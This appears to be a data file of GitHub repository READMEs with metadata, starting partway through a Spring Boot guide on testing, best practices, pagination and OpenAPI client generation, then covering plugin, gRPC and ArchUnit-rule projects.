In this project, we use [Testcontainers](https://testcontainers.com/) to facilitate integration testing with a real
PostgreSQL database running in a
Docker container. This ensures that our tests run in an environment that closely mirrors production.

#### Note

To run these integration tests, Docker needs to be running on your machine. However, if Docker is not available or
running, the tests will automatically be skipped. This is managed by the following annotation in the test class:

```java
@Testcontainers(disabledWithoutDocker = true)
```

**What This Means:**

- **If Docker is running:** The integration tests will run as usual.
- **If Docker is not running:** The tests won't run, so you won't get any errors related to Docker not being available.

This setup ensures that you won't face issues with integration tests if you donâ€™t have Docker running. Itâ€™s a way to
avoid unnecessary errors and make sure you can keep working without interruptions, especially if you're new and still
setting up your environment.

If you need to run the integration tests, just make sure Docker is installed and running on your machine.

---

## 12. Best Practices

**Disclaimer**: The practices outlined here reflect my personal approach based on what I have learned and observed from
various resources. While I believe these practices can help in building clean, maintainable, and scalable Spring Boot
applications, they are by no means the only way to approach development. I encourage you to explore other perspectives,
adapt these practices to your needs, and continuously evolve your methods as new tools and techniques emerge.

When developing Spring Boot applications, following best practices ensures your code is clean, maintainable, and
scalable. Below are some key practices to keep in mind:

### 1. Use DTOs to Abstract Entity Data

- **Purpose**: DTOs (Data Transfer Objects) are used to encapsulate data transferred between the client and server. By
  using DTOs, you prevent exposing your JPA entities directly to the client, which can mitigate security risks and
  decouple your API's data model from its internal domain model.
- **Implementation**:
    - Use tools like MapStruct or write custom mappers to convert between entities and DTOs.
    - Ensure that your controllers interact with services using DTOs, not entities, to maintain a clear separation of
      concerns.

### 2. Leverage Springâ€™s Dependency Injection

- **Purpose**: Dependency Injection (DI) allows for the automatic management of your applicationâ€™s dependencies,
  promoting loose coupling and easier testing.
- **Best Practices**:
    - **Use Constructor Injection**: Prefer constructor injection over field injection as it makes your classes easier
      to test, clearly indicates the dependencies of your class, and supports immutability.
    - **Avoid Field Injection**: Field injection can lead to issues in unit testing and hides dependencies, making the
      code harder to understand and maintain.
    - **Use `@Autowired`**: Springâ€™s `@Autowired` annotation can be used to inject dependencies, but constructor
      injection is more explicit and recommended.

### 3. Handle Exceptions Globally

- **Purpose**: Centralized exception handling allows you to manage errors consistently across your application,
  improving the user experience and simplifying error management.
- **Implementation**:
    - Use `@ControllerAdvice` to create a global exception handler that handles exceptions thrown across the
      application.
    - Use `@ExceptionHandler` within `@ControllerAdvice` to specify custom handling logic for specific exception types.
    - Return structured error responses using a consistent format, which can be encapsulated in a DTO like
      `APIResponse`.

### 4. Organize Your Code

- **Purpose**: A well-organized codebase makes the project easier to navigate, understand, and maintain, especially as
  it grows in complexity.
- **Best Practices**:
    - **Separate Concerns**: Maintain a clean and organized project structure by separating concerns into different
      layers (e.g., controllers, services, repositories).
    - **Keep Methods Small**: Break down large methods into smaller, single-purpose methods to enhance readability and
      maintainability. Each method should do one thing and do it well.
    - **Avoid Repetition**: Follow the DRY (Don't Repeat Yourself) principle by abstracting common logic into reusable
      methods or classes.

### 5. Naming Conventions

- **Purpose**: Consistent naming conventions improve the readability and maintainability of your code, making it easier
  for other developers (and your future self) to understand the purpose of classes, methods, and variables.
- **Best Practices**:
    - **Packages**: Use lowercase and singular names for packages (e.g., `com.ainigma100.customerapi.controller`).
    - **Classes**: Follow PascalCase for class names (e.g., `CustomerService`), and ensure names are meaningful and
      descriptive.
    - **Methods**: Use camelCase for method names (e.g., `getCustomerById`) and keep method names descriptive to reflect
      their actions.
    - **Endpoints**: Use lowercase and hyphen-separated words for REST API endpoint paths (e.g., `/api/v1/customers`),
      and use plural nouns for collections (e.g., `/customers`).

### 6. Use Wrapper Objects for API Responses

- **Purpose**: Wrapping API responses in a standardized object (like `APIResponse`) ensures consistent structure,
  improves readability, and makes it easier to include additional metadata (e.g., status, errors) along with the actual
  data.
- **Implementation**:
    - **Standardized Structure**: Define a generic response class that encapsulates the response data, status, and any
      errors. This approach provides a uniform response format across all endpoints.
    - **Builder Pattern**: Use the Builder pattern to construct response objects, which enhances readability and
      flexibility by allowing you to add only the fields you need.
    - **Consistency**: Return response objects in all your controller methods to ensure that clients receive a
      consistent response format, which simplifies client-side parsing and error handling.

### 7. Break Down Complex Logic

- **Purpose**: Breaking down complex logic into smaller, manageable pieces makes your code easier to understand, test,
  and maintain.
- **Best Practices**:
    - **Refactor Large Methods**: If a method is doing too much, refactor it into smaller methods that each handle a
      specific part of the logic. This improves readability, makes your code more modular, and simplifies testing.
    - **Single Responsibility Principle (SRP)**: Ensure that each class and method has only one responsibility. This
      principle helps to make your code more focused, easier to maintain, and less prone to errors.
    - **Avoid Deep Nesting**: Deeply nested code blocks can be hard to follow and maintain. Consider early exits (using
      return statements) and breaking nested blocks into separate methods to enhance clarity.

### 8. Document Your Code

- **Purpose**: Well-documented code helps new developers understand the application quickly and ensures that the purpose
  of classes and methods is clear.
- **Best Practices**:
    - **Use Swagger for API Documentation**: Instead of using only the traditional Javadoc comments, leverage Swagger
      annotations to document your APIs. This approach provides interactive documentation that clients can use to
      understand and test your services.
    - **Descriptive Method and Property Names**: Ensure that your method and property names are self-explanatory, making
      the code easier to read and understand without requiring extensive comments.
    - **Generate and Share Swagger Documentation**: Utilize classes to generate Swagger documentation and export it as a
      file. This allows you to share the API documentation easily with others, ensuring they have the necessary
      information to interact with your services. You can reuse the classes I wrote in the current project.
    - **Inline Comments**: Use inline comments sparingly to explain complex logic or to provide context about why
      certain decisions were made. Comments should add value by explaining the ""why"" behind the code, not the ""what."" If
      your code is clear on what it does, it is not mandatory to add comments.

### 9. Version Control and CI/CD

- **Purpose**: Implementing a robust version control and CI/CD (Continuous Integration/Continuous Deployment) pipeline
  ensures that your codebase is always in a deployable state and that changes are tracked, reviewed, and integrated
  systematically.
- **Best Practices**:
    - **Git**: Use Git for version control, and follow a branching strategy (e.g., GitFlow) to manage feature
      development, bug fixes, and releases. Commit often with meaningful commit messages to document the history of your
      project.
    - **Code Reviews**: Incorporate code reviews into your development process to catch issues early, share knowledge
      across the team, and maintain code quality.
    - **CI/CD Pipeline**: Set up a CI/CD pipeline using tools like Jenkins, GitHub Actions, GitLab CI, or CircleCI to
      automate the building, testing, and deployment of your application. This pipeline should include:
        - **Automated Testing**: Ensure that all tests run automatically on every commit to catch issues early.
        - **Code Quality Checks**: Integrate tools like SonarQube or Checkstyle to enforce coding standards and detect
          potential issues.
        - **Deployment Automation**: Automate the deployment process to reduce manual errors and speed up delivery.

### 10. Database Migrations with Liquibase or Flyway

- **Purpose**: Database migration tools like Liquibase and Flyway help manage schema changes in a consistent and
  controlled manner. They are particularly useful in environments where the database schema evolves over time.
- **When to Use**:
    - **Use Case**: If your application requires frequent schema changes, or if you work in a team where multiple
      developers are modifying the database, using a migration tool is essential. It ensures that all changes are
      versioned, documented, and applied consistently across different environments (development, testing, production).
    - **When Not Needed**: If your application uses a fixed schema that rarely changes, or if you're using a database
      with a predefined schema where you don't manage the tables (e.g., a third-party service), you might not need a
      migration tool. In such cases, focusing on data access rather than schema management is more appropriate.
- **Best Practices**:
    - **Version Control for Migrations**: Always check your migration scripts into version control alongside your
      application code. This ensures that schema changes are versioned with the corresponding application changes.
    - **Automate Migrations**: Integrate your migration tool into your CI/CD pipeline to ensure that migrations are
      applied automatically during deployment, reducing the risk of human error.

### 11. Static Code Analysis with SonarQube

- **Purpose**: SonarQube helps improve code quality by automatically detecting issues like bugs, security
  vulnerabilities, and code smells.

- **Best Practices**:
    - **Integrate into CI/CD**: Add SonarQube to your CI/CD pipeline so that your code is checked for quality every time
      you commit or create a pull request.
    - **Set Quality Gates**: Define thresholds for things like code coverage and bugs in SonarQube to ensure your code
      meets quality standards before itâ€™s merged.
    - **Act on Reports**: Regularly review SonarQube reports and fix any issues it finds, focusing on critical problems
      first.
    - **Team Awareness**: Make sure your team understands how to use SonarQube reports to improve their code.
    - **Manage Technical Debt**: Use SonarQube to track and reduce technical debt by identifying areas that need
      refactoring.

---

## 13. Enhanced Pagination Example

Pagination is an essential feature when dealing with large datasets in any application. It helps in breaking down large
amounts of data into manageable chunks, improving both performance and user experience. In this section, I will walk
through an enhanced pagination implementation using Spring Boot that you can adapt for your own projects.

This example will demonstrate how to retrieve paginated and sorted customer data from the database, leveraging custom
search criteria.

### CustomerSearchCriteriaDTO

The `CustomerSearchCriteriaDTO` class is used to encapsulate the search criteria that the client sends to the server.
This DTO not only includes pagination parameters like page and size but also allows for sorting and filtering based on
various fields like firstName, lastName, email, etc.

Itâ€™s important to note that all the search fields `firstName`, `lastName`, `email`, `phoneNumber`, and `dateOfBirth` are
optional. You can use them to filter records based on the criteria you need. If no filtering is needed, you can simply
pass the pagination and sorting details.

<details>
  <summary>View CustomerSearchCriteriaDTO code</summary>

```java
package com.ainigma100.customerapi.dto;

import com.ainigma100.customerapi.utils.SortItem;
import io.swagger.v3.oas.annotations.media.Schema;
import jakarta.validation.constraints.*;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.Setter;

import java.time.LocalDate;
import java.util.List;

@Setter
@Getter
@RequiredArgsConstructor
public class CustomerSearchCriteriaDTO {

    private String firstName;
    private String lastName;
    private String email;
    private String phoneNumber;
    private LocalDate dateOfBirth;

    @NotNull(message = ""page cannot be null"")
    @PositiveOrZero(message = ""page must be a zero or a positive number"")
    private Integer page;

    @Schema(example = ""10"")
    @NotNull(message = ""size cannot be null"")
    @Positive(message = ""size must be a positive number"")
    private Integer size;

    private List<SortItem> sortList;

}
```

</details>



For example, you can send a request like this:

```json
{
  ""page"": 0,
  ""size"": 10,
  ""sortList"": [
    {
      ""field"": ""id"",
      ""direction"": ""ASC""
    }
  ]
}
```

Assuming you have this record in your database:

```json
{
  ""id"": 2,
  ""firstName"": ""marco"",
  ""lastName"": ""polo"",
  ""email"": ""mpolo@gmail.com"",
  ""phoneNumber"": ""1234567891"",
  ""dateOfBirth"": ""2004-08-13""
}
```

If you need to filter only by firstName, you can send a request like this:

```json
{
  ""firstName"": ""marco"",
  ""page"": 0,
  ""size"": 10,
  ""sortList"": [
    {
      ""field"": ""id"",
      ""direction"": ""ASC""
    }
  ]
}
```

**Note**: You can experiment with different combinations of filters and pagination parameters based on your needs.

### Repository Query for Pagination and Filtering

The following query is responsible for handling pagination and filtering.

```java

@Query(value = """"""
        select cus from Customer cus
        where ( :#{#criteria.firstName} IS NULL OR LOWER(cus.firstName) LIKE LOWER( CONCAT(:#{#criteria.firstName}, '%') ) )
        and ( :#{#criteria.lastName} IS NULL OR LOWER(cus.lastName) LIKE LOWER( CONCAT(:#{#criteria.lastName}, '%') ) )
        and ( :#{#criteria.email} IS NULL OR LOWER(cus.email) LIKE LOWER( CONCAT('%', :#{#criteria.email}, '%') ) )
        and ( :#{#criteria.phoneNumber} IS NULL OR LOWER(cus.phoneNumber) LIKE LOWER( CONCAT('%', :#{#criteria.phoneNumber}, '%') ) )
        and ( :#{#criteria.dateOfBirth} IS NULL OR cus.dateOfBirth = :#{#criteria.dateOfBirth} )
        """""")
Page<Customer> getAllCustomersUsingPagination(
        @Param(""criteria"") CustomerSearchCriteriaDTO customerSearchCriteriaDTO,
        Pageable pageable);
```

### Query Analysis

The query allows you to filter customer data based on the criteria you provide. Hereâ€™s how it works:

- **Flexible Filters**: Each field, like `firstName` or `email`, can be used to filter results. If you donâ€™t need a
  specific filter, you can leave it out, and the query will ignore that field.
- **Examples**:
    - **Filtering by First Name**: If you provide a `firstName`, the query looks for customers whose names start with
      that value.
    - **Flexible Email Search**: The query can find customers even if you provide only part of their email address.

This approach makes the query easy to use and flexible for different search needs.

### Utils Class

To facilitate pagination and sorting, a utility class is often needed. Below is an example of a utility class that helps
in creating pageable objects based on the SortItem list provided in the DTO.

<details>
  <summary>View Utils code</summary>

```java
package com.ainigma100.customerapi.utils;

import lombok.extern.slf4j.Slf4j;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Pageable;
import org.springframework.data.domain.Sort;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.function.Supplier;

@Slf4j
public class Utils {

    // Private constructor to prevent instantiation
    private Utils() {
        throw new IllegalStateException(""Utility class"");
    }


    /**
     * Retrieves a value from a Supplier or sets a default value if a NullPointerException occurs.
     * Usage example:
     *
     * <pre>{@code
     * // Example 1: Retrieve a list or provide an empty list if null
     * List<Employee> employeeList = Utils.retrieveValueOrSetDefault(() -> someSupplierMethod(), new ArrayList<>());
     *
     * // Example 2: Retrieve an Employee object or provide a default object if null
     * Employee emp = Utils.retrieveValueOrSetDefault(() -> anotherSupplierMethod(), new Employee());
     * }</pre>
     *
     * @param supplier     the Supplier providing the value to retrieve
     * @param defaultValue the default value to return if a NullPointerException occurs
     * @return the retrieved value or the default value if a NullPointerException occurs
     * @param <T>          the type of the value
     */
    public static <T> T retrieveValueOrSetDefault(Supplier<T> supplier, T defaultValue) {

        try {
            return supplier.get();

        } catch (NullPointerException ex) {

            log.error(""Error while retrieveValueOrSetDefault {}"", ex.getMessage());

            return defaultValue;
        }
    }


    public static Pageable createPageableBasedOnPageAndSizeAndSorting(List<SortItem> sortList, Integer page, Integer size) {

        List<Sort.Order> orders = new ArrayList<>();

        if (sortList != null) {
            // iterate the SortList to see based on which attributes we are going to Order By the results.
            for (SortItem sortValue : sortList) {
                orders.add(new Sort.Order(sortValue.getDirection(), sortValue.getField()));
            }
        }


        return PageRequest.of(
                Optional.ofNullable(page).orElse(0),
                Optional.ofNullable(size).orElse(10),
                Sort.by(orders));
    }

}
```

</details>

### SortItem

The SortItem class encapsulates the sorting criteria, including the field to be sorted and the direction (ascending or
descending).

<details>
  <summary>View SortItem code</summary>

```java
package com.ainigma100.customerapi.utils;

import io.swagger.v3.oas.annotations.media.Schema;
import lombok.Getter;
import org.springframework.data.domain.Sort;

import java.io.Serializable;

@Getter
public class SortItem implements Serializable {


    @Schema(example = ""id"") // set a default sorting property for swagger
    private String field;
    private Sort.Direction direction;

}
```

</details>


**Note**: You can check the implementation and the testing of this feature by reading the code.

By implementing enhanced pagination, you ensure that your application can efficiently handle large datasets while
providing users with a responsive experience. This approach is versatile and can be adapted to various other scenarios
in your application.

---

## 14. Appendix: Using `openapi-generator-maven-plugin` for API Client Generation

**The configuration in this section is not part of the current project but is provided to share it with the community
for educational purposes. You will not find it in the codebase, but you may find it useful if you need to generate 
client code for an external API.**

### Overview

In many cases, when working with external APIs, the provider may supply an OpenAPI (Swagger) specification. Instead of
manually creating models and client code, you can use the `openapi-generator-maven-plugin` to automate this process.
This saves development time and ensures the API client and models are always in sync with the specification.

### Why Use This Plugin?

The `openapi-generator-maven-plugin` is particularly useful in scenarios such as:

- **Integrating with Third-Party APIs**: You can generate client code automatically based on external API
  specifications (Swagger).
- **Maintaining Consistency**: When APIs change frequently, auto-generating code ensures that your models and API
  clients remain consistent with the latest API definitions.
- **Avoiding Manual Model Creation**: Instead of creating Java models for responses manually, you can generate them
  directly from the Swagger spec.
- **Time-Saving**: Automating the process of generating client code from API definitions saves time and effort when
  integrating with complex or frequently changing APIs.

### Benefits of Using OpenAPI Generator

1. **Auto-Generated API Clients**: Automatically generate Java client code to call external APIs, avoiding the need to
   manually code the clients.
2. **Consistent Models**: Ensure consistency between the API models and the actual API by generating them from the spec.
3. **Faster Development**: Automates the client code generation process, allowing you to quickly integrate with
   third-party APIs.
4. **Swagger Files for External API Calls**: When provided with a Swagger spec for an external API, you can generate the
   client code and models instead of writing them by hand.

**Note**: Most of the time I use it to check the APIs and to avoid implementing the Java objects they return.

### How to Use `openapi-generator-maven-plugin`

Although this is not part of the current project, here's an example of how you could configure the plugin to generate
client code for external APIs:

### Step 1: Add the Swagger Files

Create a folder named swagger inside src/main/resources and place your OpenAPI specification files (in JSON or YAML
format) inside.

```
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ main/
â”‚   â”‚   â”œâ”€â”€ java/
â”‚   â”‚   â””â”€â”€ resources/
â”‚   â”‚       â””â”€â”€ swagger/
â”‚   â”‚           â”œâ”€â”€ department-api.json
```

### Step 2: Configure `pom.xml`

Before adding new dependencies, check if you already have similar dependencies to avoid conflicts. Add the necessary
properties and dependencies:

```xml

<properties>
    <!-- other properties -->

    <!-- Add the latest versions -->
    <springdoc-openapi-starter-webmvc-ui.version>2.6.0</springdoc-openapi-starter-webmvc-ui.version>
    <openapi-generator-maven-plugin.version>7.8.0</openapi-generator-maven-plugin.version>
    <jackson-databind-nullable.version>0.2.6</jackson-databind-nullable.version>
</properties>
```

Add the required dependencies:

```xml

<dependency>
    <groupId>org.springdoc</groupId>
    <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>
    <version>${springdoc-openapi-starter-webmvc-ui.version}</version>
</dependency>

<dependency>
<groupId>org.openapitools</groupId>
<artifactId>jackson-databind-nullable</artifactId>
<version>${jackson-databind-nullable.version}</version>
</dependency>
```

### Step 3: Add the OpenAPI Generator Plugin

```xml

<plugin>
    <groupId>org.openapitools</groupId>
    <artifactId>openapi-generator-maven-plugin</artifactId>
    <version>${openapi-generator-maven-plugin.version}</version>
    <executions>
        <!-- Generate Department API client code -->
        <execution>
            <id>department-api</id>
            <goals>
                <goal>generate</goal>
            </goals>
            <configuration>
                <inputSpec>${project.basedir}/src/main/resources/swagger/department-api.json</inputSpec>
                <generatorName>spring</generatorName>
                <output>${project.build.directory}/gen-openapi/department</output>
                <apiPackage>${project.groupId}.department.api</apiPackage>
                <modelPackage>${project.groupId}.department.model</modelPackage>
                <generateSupportingFiles>true</generateSupportingFiles>
                <configOptions>
                    <delegatePattern>true</delegatePattern>
                    <interfaceOnly>true</interfaceOnly>
                    <useSpringBoot3>true</useSpringBoot3>
                    <cleanupOutput>true</cleanupOutput>
                </configOptions>
            </configuration>
        </execution>

        <!-- You can add more files here as a new execution. Just be sure to have different 'id' -->

    </executions>
</plugin>
```

### Step 4: Run Maven Command

Run the following Maven command to generate the code based on the OpenAPI specifications.

```shell
mvn clean install
```

As soon as you run the above command, you will notice that some generated files have been
created in the target folder. You will find inside there the ```APIs``` and the ```Models```.

```
â”œâ”€â”€ target/
â”‚   â””â”€â”€ gen-openapi/
â”‚       â”œâ”€â”€ department/
```

### Step 5: Generate Sources and Update Folders (if necessary)

If after running `mvn clean install` you find that the generated models are not imported into your project, you may need
to manually update the project sources. Follow these steps:

1. Right-click on your project in your IntelliJ.
2. Navigate to `Maven` â†’ `Generate Sources and Update Folders`.

This action triggers Maven to re-import the generated sources into your project. After completion, verify that the
generated models are now accessible within your project structure.

### Additional Configurations

The `openapi-generator-maven-plugin` offers a variety of configurations to customize the generated code, such as
generating different types of API clients, models, or server stubs. You can explore more configurations and options in
the official plugin documentation
found https://github.com/OpenAPITools/openapi-generator/tree/master/modules/openapi-generator-maven-plugin.

### Summary

Using tools like `openapi-generator-maven-plugin` can save time and effort when working with external APIs. It automates
the creation of client code and models, ensuring that they are always consistent with the API spec, without manual
intervention. Although not included in this guide's codebase, this is a useful technique for certain scenarios where you
frequently call external services based on OpenAPI specifications.

---

## 15. Feedback and Contributions

Feedback and contributions are welcome! If you have suggestions, improvements, or additional insights, please feel free
to share. Together, we can make this a valuable resource for anyone learning Spring Boot 3.

",0,0,1,1.0,"['spring', 'boot', 'knowledge', 'share', 'table', 'content', 'introduction', 'what', 'spring', 'boot', 'why', 'use', 'spring', 'boot', 'project', 'structure', 'overview', 'package', 'their', 'purpose', 'introduction', 'maven', 'what', 'maven', 'what', 'pom', 'key', 'concept', 'pom', 'project', 'coordinate', 'dependency', 'plugins', 'example', 'file', 'customer', 'api', 'dependency', 'include', 'add', 'more', 'dependency', 'explanation', 'plugin', 'configuration', 'key', 'annotation', 'spring', 'boot', 'spring', 'boot', 'annotation', 'dependency', 'injection', 'component', 'scan', 'entity', 'class', 'annotation', 'controller', 'class', 'annotation', 'configuration', 'bean', 'management', 'event', 'handle', 'lombok', 'annotation', 'additional', 'note', 'dependency', 'injection', 'spring', 'boot', 'why', 'use', 'dependency', 'injection', 'constructor', 'injection', 'use', 'lombok', 'simplify', 'constructor', 'injection', 'the', 'autowired', 'annotation', 'without', 'use', 'lombok', 'annotation', 'why', 'constructor', 'injection', 'better', 'design', 'pattern', 'restful', 'api', 'mvc', 'restful', 'api', 'architecture', 'mvc', 'difference', 'between', 'restful', 'api', 'mvc', 'choose', 'right', 'pattern', 'name', 'convention', 'package', 'name', 'class', 'naming', 'entity', 'name', 'api', 'endpoint', 'naming', 'configure', 'why', 'general', 'configuration', 'configuration', 'activate', 'profile', 'best', 'practice', 'example', 'file', 'customer', 'api', 'specify', 'active', 'profile', 'note', 'detail', 'package', 'breakdown', 'entity', 'layer', 'why', 'not', 'use', 'data', 'importance', 'equal', 'hashcode', 'additional', 'column', 'specification', 'repository', 'layer', 'query', 'method', 'overview', 'derive', 'query', 'method', 'custom', 'query', 'query', 'native', 'query', 'when', 'use', 'native', 'query', 'dtos', 'mapstruct', 'key', 'concept', 'service', 'layer', 'key', 'concept', 'controller', 'layer', 'key', 'concept', 'http', 'method', 'annotation', 'exception', 'handle', 'global', 'exception', 'handler', 'custom', 'exception', 'structured', 'error', 'response', 'helper', 'class', 'openapiconfig', 'loggingfilter', 'filtersconfig', 'serverdetails', 'test', 'unit', 'test', 'behavior', 'driven', 'development', 'bdd', 'test', 'intellij', 'live', 'template', 'bdd', 'test', 'repository', 'layer', 'test', 'service', 'layer', 'test', 'controller', 'layer', 'key', 'point', 'note', 'integration', 'test', 'use', 'docker', 'testcontainers', 'note', 'best', 'practice', 'use', 'dtos', 'abstract', 'entity', 'data', 'leverage', 'spring', 's', 'dependency', 'injection', 'handle', 'exception', 'globally', 'organize', 'your', 'code', 'name', 'convention', 'use', 'wrapper', 'object', 'api', 'response', 'break', 'down', 'complex', 'logic', 'document', 'your', 'code', 'version', 'control', 'database', 'migration', 'liquibase', 'flyway', 'static', 'code', 'analysis', 'sonarqube', 'enhance', 'pagination', 'example', 'customersearchcriteriadto', 'repository', 'query', 'pagination', 'filtering', 'query', 'analysis', 'utils', 'class', 'sortitem', 'appendix', 'using', 'api', 'client', 'generation', 'overview', 'why', 'use', 'this', 'plugin', 'benefit', 'use', 'openapi', 'generator', 'how', 'use', 'step', 'add', 'swagger', 'file', 'step', 'configure', 'step', 'add', 'openapi', 'generator', 'plugin', 'step', 'run', 'maven', 'command', 'step', 'generate', 'source', 'update', 'folder', 'if', 'necessary', 'additional', 'configuration', 'summary', 'feedback', 'contribution']","['use', 'api', 'annotation', 'query', 'spring']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
mqttsnet/open-exp-plugin,main,"<div align=""center"">

[![MQTTSNET Logo](./docs/images/logo.png)](http://www.mqttsnet.com)

</div>

## ThingLinks Open Exp Plugin | [ä¸­æ–‡æ–‡æ¡£](README_zh.md)

# Open Exp Plugin Overview

**Open-Exp-Plugin Sample Marketplace** is a plugin repository based on the ThingLinks Open EXP extension point plugin system. It is designed to demonstrate how to develop, extend, and integrate functionalities within the ThingLinks platform. This marketplace provides a variety of plugin examples to help developers quickly get started and understand the powerful capabilities and flexibility of the plugin system.

## Features

- **Plugin Architecture**: Demonstrates the ThingLinks plugin architecture, supporting various plugin development models.
- **Hot-Swappable Support**: Plugins support dynamic installation and uninstallation at runtime without restarting the main application.
- **Multi-Tenant Support**: Supports loading different plugins based on tenant ID for customized functionality.
- **Modular Design**: Plugins and the main application adopt a modular design, supporting the isolation and integration of extension points and plugins.
- **Classloader Isolation**: Provides Parent First and Self First classloader isolation mechanisms to ensure independence between plugins.

## Usage Example

### How to Use the Plugin Sample Marketplace

1. **Enable Dependencies and Select Plugins**: Enable the `example` related dependencies in the `pom.xml` file of the `open-exp-plugin` module.

   ![img_1.png](docs/images/img_1.png)

2. **Reload Projects**: Reload all Maven projects to ensure the dependencies are correctly loaded.

3. **Clean and Package**: Clean and package the `all-package` module.

   ![img_2.png](docs/images/img_2.png)

4. **After Packaging**: The plugin packages are by default generated in the `exp-plugins` directory.

   ![img_3.png](docs/images/img_3.png)

5. **Start the Main Application**: Run the `Main` class in the `example-springboot3` module.

   The main application will automatically load and install the packaged plugins. If you need to reinstall or uninstall plugins, simply call the relevant API.

### Notes

1. **Configuration Definition**: Plugin configurations should be defined in the `Boot` class.
   ![img_4.png](docs/images/img_4.png)
   Configuration usage:
   ![img_5.png](docs/images/img_5.png)

2. **MQTT Configuration**: In the `example-plugin-tcptomqtt` and `example-plugin-udptomqtt` plugins, MQTT server configurations should be adjusted according to the actual environment.
   ![img_8.png](docs/images/img_8.png)

3. **Annotation Import**: Ensure that the packages imported by the `@PostConstruct` and `@PreDestroy` annotations in the plugin's entry point are correct.
   ![img_7.png](docs/images/img_7.png)

## Core Features

- **Extension Point Interface**: Defines multiple extension point interfaces for plugins to implement.
- **Multi-Tenant Support**: Different tenants can use different plugin implementations, with support for tenant priority sorting and filtering.
- **Hot-Swappable Mechanism**: Supports dynamic loading and unloading of plugins, enhancing system extensibility and flexibility.
- **Classloader Isolation**: Ensures isolation between the plugin and the main application classloader, maintaining independence and security.

## License

[Apache License, Version 2.0](LICENSE)

## Contact

If you have any questions or need support, please contact the community team at mqttsnet@163.com.

## Source Code

The source code for this project is available at: [GitHub Repository](https://github.com/mqttsnet/open-exp-plugin)

## Join Us

We welcome you to join the **MQTTSNET Community**, where you can explore and promote IoT technology development together with developers from around the world. Through the community, you can access the latest technical information, rich development resources, and opportunities to communicate with other developers.

Visit the [ThingLinks Official Website](https://www.mqttsnet.com) for more information and to join our developer community!
",0,0,3,8.0,"['thinglinks', 'open', 'exp', 'plugin', 'open', 'exp', 'plugin', 'overview', 'feature', 'usage', 'example', 'how', 'use', 'plugin', 'sample', 'marketplace', 'note', 'core', 'feature', 'license', 'contact', 'source', 'code', 'join', 'u']","['plugin', 'open', 'exp', 'feature', 'thinglinks']",8.0,"[org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,7.0,1.0
spring-projects-experimental/spring-grpc,main,"# Spring gRPC [![build status](https://github.com/spring-projects-experimental/spring-grpc/actions/workflows/deploy.yml/badge.svg)](https://github.com/spring-projects/spring-grpc/actions/workflows/deploy.yml)

Welcome to the Spring gRPC project!

The Spring gRPC project provides a Spring-friendly API and abstractions for developing gRPC applications.

For further information go to our [Spring gRPC reference documentation](https://docs.spring.io/spring-grpc/reference/).

",0,12,1,10.0,"['spring', 'grpc', 'build', 'status', 'http', 'https']","['spring', 'grpc', 'build', 'status', 'http']",8.0,"[com.mycila:license-maven-plugin,io.spring.javaformat:spring-javaformat-maven-plugin,io.spring.maven.antora:antora-component-version-maven-plugin,io.spring.maven.antora:antora-maven-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-project-info-reports-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,org.xolstice.maven.plugins:protobuf-maven-plugin]",0.0,5.0,3.0
enofex/taikai,main,"<p align=""center"">
    <img src=""docs/icon.png""
        height=""150"">
</p>

<p align=""center"">
    <img src=""https://github.com/enofex/taikai/actions/workflows/maven.yml/badge.svg"" />
    <img src=""https://img.shields.io/badge/Java%20Version-21-orange"" />
    <img height=""20"" src=""https://sonarcloud.io/images/project_badges/sonarcloud-orange.svg"">
</p>

# Taikai

Taikai extends the capabilities of the popular ArchUnit library by offering a comprehensive suite of predefined rules tailored for various technologies. It simplifies the enforcement of architectural constraints and best practices in your codebase, ensuring consistency and quality across your projects.

## Maven Usage

Add Taikai as a dependency in your `pom.xml`:

```xml
<dependency>
  <groupId>com.enofex</groupId>
  <artifactId>taikai</artifactId>
  <version>${taikai.version}</version>
  <scope>test</scope>
</dependency>
```

Replace `${taikai.version}` with the appropriate version defined in your project. Ensure that the required dependencies like ArchUnit are already declared.

## Gradle Usage

Add Taikai as a dependency in your `build.gradle` file:

```groovy
testImplementation ""com.enofex:taikai:${taikaiVersion}""
```

Replace `${taikaiVersion}` with the appropriate version defined in your project. Ensure that the required dependencies like ArchUnit are already declared.

## JUnit 5 Example Test

Here's an example demonstrating the usage of some Taikai rules with JUnit 5. Customize rules as needed using `TaikaiRule.of()`.

```java
@Test
void shouldFulfillConstraints() {
  Taikai.builder()
      .namespace(""com.enofex.taikai"")
      .java(java -> java
          .noUsageOfDeprecatedAPIs()
          .methodsShouldNotDeclareGenericExceptions()
          .utilityClassesShouldBeFinalAndHavePrivateConstructor()
          .imports(imports -> imports
              .shouldHaveNoCycles()
              .shouldNotImport(""..shaded.."")
              .shouldNotImport(""org.junit..""))
          .naming(naming -> naming
              .classesShouldNotMatch("".*Impl"")
              .methodsShouldNotMatch(""foo"")
              .fieldsShouldNotMatch(""bar"")
              .fieldsShouldMatch(""com.awesome.Foo"", ""foo"")
              .constantsShouldFollowConventions()
              .interfacesShouldNotHavePrefixI()))
      .logging(logging -> logging
          .loggersShouldFollowConventions(Logger.class, ""logger"", List.of(PRIVATE, FINAL)))      
      .test(test -> test
          .junit5(junit5 -> junit5
              .classesShouldNotBeAnnotatedWithDisabled()
              .methodsShouldNotBeAnnotatedWithDisabled()))
      .spring(spring -> spring
          .noAutowiredFields()
          .boot(boot -> boot
              .springBootApplicationShouldBeIn(""com.enofex.taikai""))
          .configurations(configuration -> configuration
              .namesShouldEndWithConfiguration())
          .controllers(controllers -> controllers
              .shouldBeAnnotatedWithRestController()
              .namesShouldEndWithController()
              .shouldNotDependOnOtherControllers()
